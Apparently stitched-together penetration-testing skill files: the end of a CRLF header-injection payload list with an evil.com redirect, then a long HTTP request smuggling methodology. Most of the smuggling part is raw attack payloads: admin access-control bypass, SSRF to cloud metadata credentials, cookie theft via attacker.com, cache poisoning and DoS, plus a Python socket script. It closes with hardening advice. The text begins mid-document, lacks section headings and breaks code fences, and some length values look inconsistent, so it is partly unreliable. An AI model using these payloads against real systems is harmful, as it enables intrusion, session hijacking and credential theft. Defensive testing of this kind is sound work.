- OWASP: HTTP Response Splitting
- RFC 7230: HTTP/1.1 Message Syntax and Routing

---

# Header Injection
%0d%0aSet-Cookie: session=hacked
%0d%0aLocation: https://evil.com
%0d%0aX-Frame-Options: ALLOWALL

# Cache Poisoning
%0d%0aLast-Modified: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aCache-Control: public, max-age=31536000
```

---

## Appendix B: Testing Checklist

- [ ] Test all URL parameters for header reflection
- [ ] Test path segments in redirect endpoints
- [ ] Test Host header in password reset flows
- [ ] Test cookie values for Set-Cookie reflection
- [ ] Test file upload filenames
- [ ] Test JSON/XML API endpoints
- [ ] Test with bare LF (`%0a`) and bare CR (`%0d`)
- [ ] Test double-encoded variants
- [ ] Test Unicode newline alternatives
- [ ] Test HTTP/2 specific vectors
- [ ] Verify cache poisoning potential
- [ ] Verify XSS escalation potential
- [ ] Verify email header injection in mail functions
- [ ] Document all successful injection points
- [ ] Provide raw HTTP response evidence


### From `normal-skills/http-request-smuggling.md`

name: http-request-smuggling
description: Comprehensive HTTP Request Smuggling testing methodology covering CL.TE desynchronization, TE.CL desynchronization, TE.TE header obfuscation, request tunnelling for access control bypass, and desync-powered attacks including SSRF, credential hijacking, and cache poisoning with optimized detection and exploitation techniques.
version: 1.0.0
---

## Overview

HTTP Request Smuggling (HRS) is an attack technique that exploits discrepancies in how front-end proxies, load balancers, CDNs, and back-end servers parse the boundaries of HTTP requests. By manipulating `Content-Length` (CL) and `Transfer-Encoding` (TE) headers—and their HTTP/2 analogues—an attacker can cause two adjacent HTTP servers to disagree on where one request ends and the next begins. This disagreement allows the attacker to "smuggle" a malicious request inside the body of an innocent-looking request, leading to request hijacking, cache poisoning, credential hijacking, and SSRF.

**HTTP Architecture Context:**
- **Content-Length (CL):** Decimal byte count of the request body. Used in HTTP/1.1 when body length is known.
- **Transfer-Encoding (TE):** `chunked` encoding splits the body into chunks prefixed with hex size. Terminated by a zero-length chunk (`0\r\n\r\n`).
- **RFC 7230 Clause:** If both CL and TE are present, TE must be preferred. However, many implementations ignore or mishandle this.
- **HTTP/2:** Uses frame-based streams with explicit DATA frame lengths. Downgrading HTTP/2 to HTTP/1.1 introduces translation vulnerabilities (H2.TE, H2.CL).
- **Connection Reuse:** HTTP/1.1 persistent connections (`Connection: keep-alive`) allow multiple requests per TCP connection, enabling smuggled requests to affect subsequent legitimate requests.

**Target Indicators:**
- Multi-tier architectures (CDN → WAF → Load Balancer → App Server)
- Mixed server technologies (e.g., nginx → Apache, CloudFront → Tomcat, HAProxy → Node.js)
- HTTP/2 enabled at the edge with HTTP/1.1 backend
- Endpoints accepting POST/PUT bodies with both CL and TE headers
- Responses revealing server composition via headers (`Server: nginx`, `Via: 1.1 varnish`, `X-Cache`)

---

### 1.1 Baseline Header Acceptance Testing

Determine how the front-end handles ambiguous or conflicting CL/TE headers.

**Test 1: TE Header Acceptance**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Analysis:**
- If the server hangs/times out → It processed TE and is waiting for the terminating `\r\n\r\n` after the zero chunk (or the `X` was treated as the start of the next request).
- If immediate response → It likely used CL=6 and ignored TE.

**Test 2: CL Header with TE Body**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12
AAAAAAAAAAAAAAAA
0

```

**Analysis:**
- If immediate response with error or truncated body → Front-end used CL=4, read `12\r\n`, sent that to backend.
- If delay/timeout → Front-end processed TE and read all chunks.

### 1.2 Timeout-Based Desync Detection (CL.TE)

Send a request designed to cause the back-end to wait for more data while the front-end considers the connection ready for the next request.

**CL.TE Detection Payload:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar
```

**Procedure:**
1. Send the above request.
2. Immediately send a follow-up innocent request on the same connection:
```http
GET / HTTP/1.1
Host: example.com
```

**Indicators of CL.TE Vulnerability:**
- The follow-up request receives a `404 Not Found` response (the smuggled `GET /404` was processed by the back-end).
- The follow-up request receives a `400 Bad Request` or connection reset (the back-end parsed the smuggled request headers and rejected them).
- Time delay: If the back-end uses TE, it waits for the `\r\n\r\n` after the zero chunk. The smuggled `GET /404...` is interpreted as the start of the next request, but incomplete. The follow-up request completes it, causing unexpected parsing.

### 1.3 Timeout-Based Desync Detection (TE.CL)

**TE.CL Detection Payload:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404 HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Procedure:**
1. Send the above request. Note: `5c` (92 in hex) is the length of the smuggled request body including the `x=1` payload.
2. Immediately send a follow-up request on the same connection.

**Indicators of TE.CL Vulnerability:**
- The front-end processes TE and reads the `5c` chunk + `0` terminator. It forwards the entire request to the back-end.
- The back-end uses CL=4, reads only `5c\r\nG` (4 bytes), and treats the remainder (`ET /404...`) as the start of the next request.
- The follow-up request is processed after the smuggled `GET /404`, resulting in a 404 response to the follow-up.

### 1.4 Differential Response Analysis

Instead of relying on timeouts, use differential responses to confirm desync.

**CL.TE Confirming Payload:**
```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 62
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: example.com
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

q=smuggled
```

**Send twice on the same connection.** If the back-end is vulnerable to CL.TE:
- Request 1: Front-end sees TE, terminates at `0\r\n\r\n`. Back-end sees CL=62, reads the smuggled POST as part of Request 1's body.
- Request 2: Front-end sends it normally. Back-end processes the smuggled POST from Request 1's body, then processes Request 2.
- Response to Request 2 will be the result of the smuggled `q=smuggled` search (differential from normal).

**TE.CL Confirming Payload:**
```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

87
POST /search HTTP/1.1
Host: example.com
Content-Length: 15
Content-Type: application/x-www-form-urlencoded

q=smuggled
0

```

**Send twice.** The back-end (using CL=4) will read `87\r\n` and leave the smuggled request in the buffer, processing it when the next request arrives.

# HTTP/2 request (translated by frontend to HTTP/1.1)
:method: POST
:path: /
:scheme: https
:authority: example.com
content-length: 0
transfer-encoding: chunked

# Body (in HTTP/2 DATA frames)
0\r\n\r\n
GET /admin HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

**Indicator:** If the HTTP/2 frontend strips `transfer-encoding` but the backend processes it (due to re-adding during downgrade), or if the frontend forwards a crafted body containing chunked encoding that the backend interprets as TE.

**H2.CL Detection:**
```http

# HTTP/2 request
:method: POST
:path: /
:scheme: https
:authority: example.com
content-length: 4

# Body
AAAA
```

**Indicator:** If the frontend uses HTTP/2 DATA frame boundaries but the backend uses the `content-length` header, and an attacker can inject a fake `content-length` during downgrade.

---

### 2.1 Attack Mechanics

In a CL.TE vulnerability:
- **Front-end:** Uses `Content-Length` to determine where the request body ends.
- **Back-end:** Uses `Transfer-Encoding: chunked` to determine where the request body ends.

The front-end forwards the request body based on CL. The back-end parses the same bytes as chunked encoding, leaving trailing bytes in the TCP buffer that are interpreted as the start of the next request.

### 2.2 CL.TE Smuggling Payloads

**Basic CL.TE Smuggle:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
Foo: bar
```

**Mechanism:**
1. Front-end reads 50 bytes (including `0\r\n\r\nGET /admin...`).
2. Forwards all 50 bytes to the back-end.
3. Back-end parses TE, sees `0\r\n\r\n` (end of chunks).
4. Remaining bytes (`GET /admin HTTP/1.1\r\nHost: example.com\r\nFoo: bar`) are left in the TCP buffer.
5. Next request on the connection is appended to these bytes.
6. Back-end processes `GET /admin HTTP/1.1\r\nHost: example.com\r\nFoo: bar[Next Request]`.

**Optimized CL.TE Payload for Access Control Bypass:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /admin/upgrade-user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

user=attacker&role=admin
```

### 2.3 CL.TE with Chunked Extensions

Some parsers accept chunked extensions (ignored by spec but processed by lenient parsers), which can be used for obfuscation.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 60
Transfer-Encoding: chunked

0;X=Y

GET /admin HTTP/1.1
Host: example.com
```

### 2.4 CL.TE Confirmation Techniques

**Technique A: Time Delay**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
0
```

If CL.TE: Front-end sends 4 bytes (`1\r\nA\r`). Back-end waits for the terminating `0\r\n\r\n` → **Timeout**.

**Technique B: Differential Response**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /thispagedoesnotexist HTTP/1.1
Foo: bar
```

Send a follow-up `GET /`. If the follow-up receives 404, the smuggled request was processed.

---

### 3.1 Attack Mechanics

In a TE.CL vulnerability:
- **Front-end:** Uses `Transfer-Encoding: chunked` to determine where the request body ends.
- **Back-end:** Uses `Content-Length` to determine where the request body ends.

The front-end reads the entire chunked body (including the smuggled request). The back-end reads only the number of bytes specified by CL, leaving the remainder of the front-end's forwarded data in the buffer as the start of the next request.

### 3.2 TE.CL Smuggling Payloads

**Basic TE.CL Smuggle:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Mechanism:**
1. Front-end parses TE. Reads chunk size `5e` (94 bytes). Reads 94 bytes of data. Reads `0\r\n\r\n` terminator. Forwards the entire request to the back-end.
2. Back-end reads CL=4 bytes (`5e\r\nP`).
3. Remaining bytes (`OST /admin HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`) are left in the buffer.
4. Next request is appended to `OST /admin...` → Back-end processes the smuggled request.

**Critical Note:** The hex chunk size (`5e` above) must exactly equal the byte length of the smuggled request body (everything after the chunk size line up to but not including the final `0\r\n\r\n`).

**Accurate TE.CL Payload Construction:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

7b
POST /admin HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Calculate `7b` (123) as the exact byte count of:
```
POST /admin HTTP/1.1\r\n
Host: example.com\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
```

### 3.3 TE.CL with Chunked Trailers

Some back-ends accept trailers after the final chunk, which can be abused to pad or obfuscate.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: example.com
Content-Length: 15

x=1
0
X-Trailer: value

```

### 3.4 TE.CL Confirmation Techniques

**Technique A: Time Delay**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If TE.CL: Front-end parses TE, terminates at `0\r\n\r\n`. Back-end reads CL=6 (`0\r\n\r\nX`). The `X` and subsequent data are treated as the next request, but incomplete → **Timeout** on next request.

**Technique B: Differential Response**
Use the same double-request technique as CL.TE, but with the TE.CL payload structure. The follow-up request should trigger the smuggled request's response.

---

### 4.1 Attack Mechanics

In a TE.TE vulnerability, both the front-end and back-end support `Transfer-Encoding: chunked`, but one of them can be tricked into NOT processing the header due to obfuscation. Once one server ignores TE, the desync reverts to either CL.TE or TE.CL behavior.

### 4.2 TE Obfuscation Techniques

The goal is to craft a `Transfer-Encoding` header that one parser recognizes and another ignores.

**Technique 1: Header Name Spacing**
```http
Transfer-Encoding : chunked
Transfer-Encoding\t: chunked
 Transfer-Encoding: chunked
```

**Technique 2: Header Value Spacing**
```http
Transfer-Encoding: chunked
Transfer-Encoding:  chunked
Transfer-Encoding:\tchunked
Transfer-Encoding:\n chunked
```

**Technique 3: Value Obfuscation**
```http
Transfer-Encoding: chunked
Transfer-Encoding: chunkedd
Transfer-Encoding: CHUNKED
Transfer-Encoding: 'chunked'
Transfer-Encoding: "chunked"
Transfer-Encoding: \x08chunked\x08
```

**Technique 4: Duplicate Conflicting Headers**
```http
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

**Technique 5: Chunked with Unsupported Encodings**
```http
Transfer-Encoding: gzip, chunked
Transfer-Encoding: chunked, identity
```

**Technique 6: Header Character Set Obfuscation**
```http
Transfer-Encoding: chünked
Transfer-Encoding: chünked
Transfer-Encoding: \x00chunked
```

**Technique 7: Line Folding (Deprecated but supported)**
```http
Transfer-Encoding: chunked
\tboundary=something
```

### 4.3 TE.TE to CL.TE Conversion

If obfuscation causes the front-end to ignore TE (uses CL) while the back-end processes TE:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 50
Transfer-Encoding: chünked

0

GET /admin HTTP/1.1
Host: example.com
```

### 4.4 TE.TE to TE.CL Conversion

If obfuscation causes the back-end to ignore TE (uses CL) while the front-end processes TE:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chünked

5e
GET /admin HTTP/1.1
Host: example.com
Content-Length: 15

x=1
0

```

### 4.5 Systematic TE.TE Fuzzing Matrix

Test each obfuscation by sending the payload and observing whether the connection times out (indicating one server is waiting) or returns immediately.

| Obfuscation | Expected CL.TE Behavior | Expected TE.CL Behavior |
|-------------|------------------------|------------------------|
| `Transfer-Encoding: chünked` | Front-end ignores TE, uses CL. Back-end processes TE. | Front-end processes TE. Back-end ignores TE, uses CL. |
| `Transfer-Encoding : chunked` | Front-end ignores TE, uses CL. Back-end processes TE. | Front-end processes TE. Back-end ignores TE, uses CL. |
| `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | Front-end uses first (chunked). Back-end uses last (identity/CL). | Front-end uses first. Back-end uses last. |
| `Transfer-Encoding:\n chunked` | Front-end ignores. Back-end processes. | Front-end processes. Back-end ignores. |

---

### 5.1 Attack Mechanics

Request Tunnelling (also called "Complete Request Smuggling" or "Single-Packet Attack") occurs when the smuggled request is a complete, valid HTTP request that the back-end processes independently of the wrapper request. This is the most powerful form of smuggling because the smuggled request can have its own headers, body, and method, completely bypassing front-end access controls.

### 5.2 Single-Packet Attack

Modern HTTP/1.1 implementations and HTTP/2 multiplexing allow multiple requests to be sent in a single TCP packet or TLS record. By sending the wrapper and smuggled requests together, the attacker ensures they arrive atomically at the front-end, reducing the chance of interference from other users' requests.

**CL.TE Single-Packet Payload:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /admin/delete-user HTTP/1.1
Host: example.com
Cookie: session=ATTACKER_SESSION
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

user=victim
GET / HTTP/1.1
Host: example.com
```

**Sending Strategy:**
1. Open a single TCP connection.
2. Send the entire payload above in one `send()` call.
3. The front-end processes the wrapper POST (CL=200, reads until end of smuggled request).
4. The back-end processes TE, sees `0\r\n\r\n`, then processes the complete smuggled POST request.
5. The trailing `GET / HTTP/1.1` is either ignored or processed as a third request depending on buffering.

### 5.3 Last-Byte Synchronization

To ensure the front-end and back-end agree on the boundary without leaving dangling data:

**CL.TE with Precise Length:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 178
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
X-Ignore: x
```

Calculate CL so that the final byte of the smuggled request aligns exactly with what the front-end expects.

### 5.4 Request Tunnelling for Access Control Bypass

**Scenario:** Front-end blocks `/admin` based on IP or path, but the back-end does not.

**Wrapper Request (Allowed Path):**
```http
POST /api/public/feedback HTTP/1.1
Host: example.com
Content-Length: 250
Transfer-Encoding: chunked

0

GET /admin/users HTTP/1.1
Host: example.com
X-Original-Url: /admin/users
Cookie: admin_session=true
```

The front-end sees `/api/public/feedback` (allowed). The back-end processes the smuggled `GET /admin/users`.

### 5.5 Request Tunnelling for Method Override

Smuggle a privileged method inside a permitted wrapper:

```http
POST /api/upload HTTP/1.1
Host: example.com
Content-Length: 150
Transfer-Encoding: chunked

0

DELETE /api/critical-resource HTTP/1.1
Host: example.com
Authorization: Bearer admin-token
```

---

### 6.1 SSRF via Request Smuggling

Force the back-end to make requests to internal services by smuggling a request that triggers internal API calls.

**CL.TE SSRF to Internal Metadata:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 250
Transfer-Encoding: chunked

0

POST /internal/webhook HTTP/1.1
Host: 169.254.169.254
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

url=http://169.254.169.254/latest/meta-data/
```

**Mechanism:** The back-end processes the smuggled POST to `/internal/webhook`, which triggers an SSRF to the cloud metadata service.

**AWS IMDSv2 via Smuggling:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 300
Transfer-Encoding: chunked

0

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
Content-Length: 0

GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: TOKEN_FROM_PREVIOUS
```

### 6.2 Credential Hijacking (Session Fixation / Theft)

Poison a victim's request to make them send their session cookie to an attacker-controlled endpoint.

**CL.TE Credential Hijacking:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 300
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: attacker.com
Content-Length: 100

Cookie: 
```

**Mechanism:**
1. Attacker sends the smuggling payload.
2. Victim's browser sends a legitimate request on the same connection.
3. The back-end interprets the victim's request as the body of the smuggled request:
```http
GET / HTTP/1.1
Host: attacker.com
Content-Length: 100

Cookie: victim_session=abc123; ...
```
4. The victim's cookies are sent in the body to `attacker.com` (if the application makes a subsequent request based on the smuggled Host) OR the response is redirected to attacker.com with the cookie.

**More Reliable: Reflected Cookie Theft via Smuggled Redirect**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /redirect?to=https://attacker.com/steal HTTP/1.1
Host: example.com
Cookie: trigger=1
```

If the back-end processes this and the next user's request appends their cookies to the smuggled request body, the redirect response may include the victim's session in query parameters or headers.

### 6.3 Cache Poisoning via Request Smuggling

Poison the cache by smuggling a request that generates a malicious response, which the cache then stores and serves.

**CL.TE Cache Poisoning:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 180
Transfer-Encoding: chunked

0

GET /popular-page HTTP/1.1
Host: example.com
X-Ignore: xGET /popular-page HTTP/1.1
Host: attacker.com
```

**Mechanism:**
1. Front-end sees the wrapper POST. Back-end sees two requests due to TE parsing.
2. The smuggled `GET /popular-page` with `Host: attacker.com` generates a response with attacker-controlled domains (redirects, CSP, CORS, JS config).
3. The cache stores this response under the key for `/popular-page` (as requested by the victim's follow-up request).
4. All subsequent users requesting `/popular-page` receive the poisoned response.

**TE.CL Cache Poisoning:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

100
GET /popular-page HTTP/1.1
Host: attacker.com
Content-Length: 100

x=
0

```

### 6.4 Cross-User Data Exposure

Smuggle a request that causes the back-end to return another user's data.

```http
POST /api/graphql HTTP/1.1
Host: example.com
Content-Length: 400
Transfer-Encoding: chunked

0

POST /api/graphql HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 50

{"query":"{ user(id:1) { email password } }"}
```

The next user's request on the connection may be appended to this smuggled body, causing the GraphQL response to be returned to the wrong user or stored in cache.

### 6.5 Desync-Powered DoS

Cause the back-end to enter an infinite loop or process invalid requests by smuggling malformed HTTP.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: example.com
Content-Length: 1000

[incomplete body]
```

The back-end waits for 1000 bytes of body for the smuggled GET (which never arrives), consuming a worker thread indefinitely.

---

### 7.1 HTTP/2 Request Smuggling (H2.TE / H2.CL)

HTTP/2 to HTTP/1.1 downgrade introduces desync because HTTP/2 uses length-prefixed frames while HTTP/1.1 uses CL/TE.

**H2.TE Attack:**
```http

# HTTP/2 request sent to frontend
:method: POST
:path: /
:scheme: https
:authority: example.com
content-length: 0

# DATA frames contain:
0\r\n\r\n
GET /admin HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

**Mechanism:** The HTTP/2 frontend forwards the body to the HTTP/1.1 backend. If the backend processes `Transfer-Encoding: chunked` (injected during downgrade or already present), it interprets the body as chunked and the trailing GET is smuggled.

**H2.CL Attack:**
```http

# DATA frames (4 bytes)
AAAA
```

**Mechanism:** If the attacker can inject a `content-length: 1000` header during downgrade (e.g., via header injection in HTTP/2 pseudo-headers), the backend waits for 1000 bytes while the frontend only sent 4 bytes in DATA frames. The next request on the HTTP/1.1 connection completes the body.

### 7.2 HTTP/2 Header Injection (CRLF in Pseudo-Headers)

Some HTTP/2 implementations improperly validate pseudo-header values, allowing CRLF injection that creates fake HTTP/1.1 headers during downgrade.

```http
:authority: example.com\r\n
Transfer-Encoding: chunked\r\n
\r\n
:path: /
```

### 7.3 Header Name Smuggling (HTTP/2)

HTTP/2 allows header names to be binary-encoded. Some implementations translate these to HTTP/1.1 without proper validation.

```http
:method: POST
:path: /
:scheme: https
:authority: example.com
transfer-encoding: chunked    # lowercase, HTTP/2 allows this
content-length: 4
```

During downgrade to HTTP/1.1, some servers normalize `transfer-encoding` to `Transfer-Encoding`, triggering TE processing on the backend while the frontend ignored it.

### 7.4 Chunked Encoding Extensions & Trailers

Abuse chunked extensions to bypass WAFs or confuse parsers.

```http
Transfer-Encoding: chunked

5;ext1=val1;ext2="val2"
hello
0;trailer1=value
Trailer-Header: data
```

Some WAFs fail to parse extensions correctly and allow malicious content through.

### 7.5 Request Smuggling via Upgrade Header

The `Upgrade: h2c` or `Upgrade: websocket` header can cause desync if front-end and back-end disagree on whether the connection is upgraded.

```http
GET / HTTP/1.1
Host: example.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

### 7.6 Response Queue Desync (Client-Side)

In HTTP/2 multiplexing, smuggling can cause responses to be associated with the wrong stream ID, delivering one user's response to another user.

---

### 8.1 Manual Testing Workflow

For each endpoint accepting POST/PUT bodies:

1. **Baseline** — Send normal request, observe response time and headers
2. **CL.TE timeout test** — Send `Content-Length: 4` + `Transfer-Encoding: chunked` + `1\r\nA\r\n0\r\n\r\n`. If timeout → possible CL.TE
3. **TE.CL timeout test** — Send `Content-Length: 6` + `Transfer-Encoding: chunked` + `0\r\n\r\nX`. If timeout on next request → possible TE.CL
4. **Differential confirmation** — Use double-request technique with a smuggled request to a unique path. Check if follow-up gets smuggled response.
5. **TE.TE fuzzing** — Systematically test all obfuscation variants from Section 4.5
6. **HTTP/2 downgrade testing** — If HTTP/2 is supported, test H2.TE and H2.CL via downgrade
7. **Impact escalation** — Attempt request tunnelling to admin endpoints, SSRF to 169.254.169.254, cache poisoning, credential hijacking
8. **Single-packet attack** — Send wrapper + smuggled + follow-up in one TCP packet for reliability
9. **Connection persistence testing** — Confirm `Connection: keep-alive` is honored by both front-end and back-end

### 8.2 Automation Script Logic (Python Pseudocode)

```python
import socket
import ssl
import time

def send_raw_http(host, port, payload, use_ssl=True):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        if use_ssl:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.sendall(payload.encode())
                return ssock.recv(4096).decode()
        else:
            sock.sendall(payload.encode())
            return sock.recv(4096).decode()

def detect_cl_te(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "A\r\n"
        "0\r\n"
        "\r\n"
    )
    try:
        send_raw_http(host, port, payload)
        time.sleep(2)
        # Send follow-up
        followup = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        resp = send_raw_http(host, port, followup)
        if "400" in resp or "timeout" in resp.lower():
            return True  # Likely CL.TE
    except:
        return True
    return False

def detect_te_cl(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    try:
        send_raw_http(host, port, payload)
        time.sleep(2)
        followup = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        resp = send_raw_http(host, port, followup)
        if "400" in resp:
            return True  # Likely TE.CL
    except:
        return True
    return False
```

### 8.3 Recommended Tools

| Tool | Purpose | Notes |
|------|---------|-------|
| **Burp Suite Professional** | Manual desync testing, Repeater, HTTP/2 support | Essential; use Repeater with "Update Content-Length" disabled |
| **Burp BApp: HTTP Request Smuggler** | Automated CL.TE/TE.CL/TE.TE detection | James Kettle's extension; scans automatically |
| **Turbo Intruder** | High-speed single-packet attacks | Use for confirmation and exploitation at scale |
| **http-request-smuggler (CLI)** | Command-line detection | `python smuggler.py -u https://example.com` |
| **curl** | Raw HTTP/1.1 testing | `curl --http1.1 -H "Transfer-Encoding: chunked" ...` |
| **h2smuggler** | HTTP/2 downgrade testing | Specialized for H2.TE / H2.CL |
| **OpenSSL s_client** | Raw TLS testing | `openssl s_client -connect host:443` for manual payload injection |
| **Wireshark/tcpdump** | Connection-level analysis | Verify packet boundaries and request splitting |

---

# nginx
keepalive_timeout 0;
keepalive_requests 1;
```

**Normalize CL and TE at the Edge:**
- Reject requests containing both `Content-Length` and `Transfer-Encoding`.
- If TE is present, strip CL before forwarding.
- If CL is present and TE is absent, validate CL is a non-negative integer.

**HTTP/2 End-to-End:**
- Do not downgrade HTTP/2 to HTTP/1.1 between tiers.
- If downgrade is unavoidable, re-validate all headers at the downgrade point.

**Strict TE Parsing:**
- Reject chunked encoding with invalid chunk sizes.
- Reject chunked extensions if not strictly required.
- Do not support `Transfer-Encoding: identity` (deprecated).

### 9.2 Reverse Proxy / Load Balancer Hardening

**HAProxy:**
```haproxy
frontend http_front
    http-request deny if hdr_cnt(Content-Length) gt 1
    http-request deny if hdr_cnt(Transfer-Encoding) gt 1
    http-request deny if hdr_beg(Content-Length) -
    # Normalize: if TE present, remove CL
    http-request del-header Content-Length if hdr(Transfer-Encoding) -m str chunked
```

**nginx:**
```nginx

# Reject requests with both headers
if ($http_transfer_encoding ~* "chunked") {
    set $te_present 1;
}
if ($http_content_length) {
    set $cl_present 1;
}
if ($te_present = 1) {
    set $both_present $cl_present;
}
if ($both_present = 1) {
    return 400;
}
```

**AWS ALB / CloudFront:**
- Enable HTTP/2 end-to-end where possible.
- Use AWS WAF to block malformed CL/TE combinations.

### 9.3 Application-Level Remediation

- **Never trust Content-Length for security decisions** if TE is also present.
- **Use framework-provided request parsing** rather than manual header inspection.
- **Validate request boundaries** at the application layer by checking for unexpected data after the declared body end.

### 9.4 Verification Steps for Fix Validation

1. **Resubmit CL.TE timeout payload** — Confirm immediate response (no timeout)
2. **Resubmit TE.CL timeout payload** — Confirm immediate response on follow-up
3. **Resubmit TE.TE obfuscation variants** — All should return 400 or use consistent parsing
4. **Test dual-header rejection** — Request with both CL and TE must be rejected (400)
5. **Test HTTP/2 downgrade** — H2.TE and H2.CL payloads should not cause desync
6. **Test single-packet attack** — Smuggled request should not be processed independently
7. **Confirm connection isolation** — Smuggled data on one connection must not affect subsequent requests
8. **Verify cache isolation** — Poisoned responses must not be cached for benign requests
9. **Test with automated scanner** — Run HTTP Request Smuggler / Nuclei to confirm negative

### 9.5 Defense-in-Depth

- **Network Segmentation:** Back-end administrative endpoints should not be reachable from the application server network layer, even if smuggled.
- **Cloud Metadata Protection:** Use IMDSv2 (session-based tokens) on AWS; require `Metadata-Flavor: Google` on GCP; disable legacy IMDSv1.
- **Cache Layer Rules:** Do not cache responses containing `Transfer-Encoding` or responses to POST requests unless explicitly designed.
- **Monitoring:** Alert on requests containing both CL and TE, malformed chunk sizes, or unusual request timing patterns.
- **Rate Limiting:** Limit connection reuse and implement per-connection request caps to reduce smuggling windows.

---

## Quick Reference: Optimized Payload Matrix

| Objective | Payload | Context |
|-----------|---------|---------|
| **CL.TE Detect** | `CL: 4`, `TE: chunked`, body `1\r\nA\r\n0\r\n\r\n` | Timeout = vulnerable |
| **TE.CL Detect** | `CL: 6`, `TE: chunked`, body `0\r\n\r\nX` | Next request timeout = vulnerable |
| **CL.TE Smuggle** | `CL: 50`, `TE: chunked`, `0\r\n\r\nGET /admin...` | Access control bypass |
| **TE.CL Smuggle** | `CL: 4`, `TE: chunked`, `[hex]\r\nGET /admin...` | Access control bypass |
| **TE.TE Obfuscation** | `Transfer-Encoding: chünked` | Bypass both parsers |
| **TE.TE Space** | `Transfer-Encoding : chunked` | Header name spacing |
| **Request Tunnel** | Complete smuggled request inside wrapper | Full request hijacking |
| **SSRF Smuggle** | Smuggle `POST /webhook` targeting `169.254.169.254` | Metadata extraction |
| **Cache Poison** | Smuggle request to cacheable path with hostile Host | Cross-user poisoning |
| **Cred Hijack** | Smuggle request with `Content-Length` consuming victim's next request | Session theft |
| **H2.TE** | HTTP/2 request with chunked body in DATA frames | HTTP/2 downgrade |
| **H2.CL** | HTTP/2 with fake CL causing backend wait | HTTP/2 downgrade |
| **Single-Packet** | Wrapper + smuggled + follow-up in one `send()` | Atomic exploitation |

---

## Testing Notes

- **Always use Repeater with "Update Content-Length" disabled** when crafting smuggling payloads in Burp Suite; automatic CL recalculation will destroy the attack.
- **Calculate chunk sizes precisely** for TE.CL; an incorrect hex length causes the back-end to parse chunk data incorrectly, leading to false negatives.
- **Use single-packet attacks for reliability** in production environments; sending wrapper and smuggled requests in separate packets increases the risk of interference from other users' requests on shared connections.
